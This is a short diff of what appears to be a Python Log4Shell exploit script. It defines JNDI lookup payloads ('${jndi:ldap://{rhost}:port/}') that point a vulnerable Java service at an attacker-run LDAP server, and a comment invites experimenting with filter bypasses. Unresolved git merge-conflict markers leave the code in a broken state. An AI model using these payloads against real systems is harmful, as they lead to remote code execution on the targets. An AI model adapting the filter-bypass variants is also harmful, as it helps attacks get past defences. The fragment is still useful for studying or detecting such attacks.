@@ -30,7 +30,17 @@ TARGETS = [
 
 
 # NOTE: This is where you want to experiment with filter bypassing:
+<<<<<<< Updated upstream
 STAGERS = ['${{jndi:ldap://{rhost}:' + str(port) + '/}}' for port in JNDI_PORTS]
+=======
+
+STAGERS = [
+    '${{jndi:ldap://{rhost}:' + str(1389) + '/}}',  # NOTE: Double brackets escape for string formatting
+    
+]
+#for port in JNDI_PORTS:
+#    STAGERS.append('${{jndi:ldap://{rhost}:' + str(port) + '/}}')
+>>>>>>> Stashed changes
 
 
 JNDI_RESPONSE = """dn:
